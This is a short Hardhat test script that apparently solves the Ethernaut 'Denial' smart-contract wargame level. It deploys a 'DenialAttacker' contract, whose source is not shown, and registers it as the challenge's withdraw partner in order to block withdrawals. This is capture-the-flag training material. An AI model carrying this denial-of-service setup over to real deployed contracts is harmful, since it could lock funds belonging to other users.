import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther,
         logEvents, dumpStorage } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Denial`);
  const challengeAddress = await createChallenge(
    `0xf1D573178225513eDAA795bE9206f7E311EeDEc3`,
    ethers.utils.parseEther("0.001")
  );

  challenge = await challengeFactory.attach(challengeAddress);

  const attackerFactory = await ethers.getContractFactory(`DenialAttacker`);
  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
  challenge.setWithdrawPartner(attacker.address);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
